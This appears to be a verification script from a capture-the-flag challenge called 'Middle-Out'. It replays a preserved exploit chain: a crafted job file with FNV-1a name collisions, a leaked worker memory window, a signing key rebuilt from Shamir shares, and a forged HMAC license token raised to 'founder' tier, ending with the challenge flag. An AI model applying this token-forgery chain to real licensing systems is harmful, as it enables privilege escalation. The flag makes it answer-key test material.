#!/usr/bin/env python3
"""Verify the preserved Middle-Out exploit artifacts without a live instance."""

from __future__ import annotations

import base64
import hashlib
import hmac
import importlib.util
import itertools
import json
import struct
from pathlib import Path


ROOT = Path(__file__).resolve().parent
ARTIFACTS = ROOT / "artifacts"


def load_solver():
    spec = importlib.util.spec_from_file_location("middle_out_solve", ROOT / "solve.py")
    if spec is None or spec.loader is None:
        raise RuntimeError("could not load solve.py")
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


def parse_job(solver, job: bytes) -> list[tuple[bytes, int, bytes]]:
    assert job[:4] == b"PPJB"
    assert struct.unpack("<H", job[4:6])[0] == 3
    metadata_length, payload_length, checksum = struct.unpack(">HII", job[6:16])
    assert len(job) == 16 + metadata_length + payload_length
    assert solver.crc32c(job[16:]) == checksum

    metadata = job[16 : 16 + metadata_length]
    fields: list[tuple[bytes, int, bytes]] = []
    cursor = 0
    while cursor < len(metadata):
        name_length = metadata[cursor]
        value_length = metadata[cursor + 1]
        fingerprint = struct.unpack(">I", metadata[cursor + 2 : cursor + 6])[0]
        cursor += 6
        name = metadata[cursor : cursor + name_length]
        cursor += name_length
        value = metadata[cursor : cursor + value_length]
        cursor += value_length
        assert solver.fnv1a32(name) == fingerprint
        fields.append((name, fingerprint, value))
    assert cursor == len(metadata)
    return fields


def main() -> None:
    solver = load_solver()
    trial = json.loads((ARTIFACTS / "trial-license.json").read_text())
    activation = json.loads((ARTIFACTS / "activation-response.json").read_text())
    job = (ARTIFACTS / "malicious-job.ppjb").read_bytes()
    leak = (ARTIFACTS / "decoded-worker-window.bin").read_bytes()

    fields = parse_job(solver, job)
    by_name = {name: (fingerprint, value) for name, fingerprint, value in fields}
    assert by_name[b"center"][1] == struct.pack(">H", 512)
    assert by_name[b"radius"][1] == struct.pack(">H", 256)
    assert by_name[solver.CENTER_ALIAS][1] == struct.pack(">H", 0)
    assert by_name[solver.RADIUS_ALIAS][1] == struct.pack(">H", 1024)
    assert by_name[b"center"][0] == by_name[solver.CENTER_ALIAS][0]
    assert by_name[b"radius"][0] == by_name[solver.RADIUS_ALIAS][0]
    print("[+] PPJB structure, CRC32C, and both FNV-1a collisions verified")

    build_key = bytes.fromhex(trial["build"])
    capsules = solver.extract_wsc4_capsules(leak[:1024], build_key)
    assert len(capsules) == 4
    shares = [solver.decrypt_share(capsule, build_key) for capsule in capsules]
    print(f"[+] validated and decrypted WSC4 slots: {[slot for slot, _ in shares]}")

    signing_key = None
    selected_slots = None
    for left, right in itertools.combinations(shares, 2):
        candidate = solver.recover_secret(left, right)
        if solver.verify_hmac_token(candidate, trial["token"]):
            signing_key = candidate
            selected_slots = (left[0], right[0])
            break
    assert signing_key is not None and selected_slots is not None
    assert signing_key.hex() == (
        "daa6e9b12b7c54a160b9b16d9c8d2b80"
        "0e26a542718426a254bdf419ed2c4649"
    )
    print(f"[+] Shamir slots {selected_slots} reconstruct the captured token's HMAC key")

    claims_segment = trial["token"].split(".")[0]
    claims = json.loads(solver.b64url_decode(claims_segment))
    claims["tier"] = "founder"
    founder_segment = solver.b64url_encode(
        json.dumps(claims, separators=(",", ":")).encode()
    )
    signature = hmac.new(
        signing_key, founder_segment.encode(), hashlib.sha256
    ).digest()
    token = founder_segment + "." + base64.urlsafe_b64encode(signature).rstrip(b"=").decode()
    assert token == (ARTIFACTS / "founder-token.txt").read_text().strip()
    assert activation == {
        "ok": True,
        "tier": "founder",
        "license": "zdk{TH3_6A7EwaY_and_W0rker_5QuEEZ3d_dLfFeR3NT_MIdD1e5}",
    }
    print("[+] founder token and captured successful activation response verified")
    print(activation["license"])


if __name__ == "__main__":
    main()
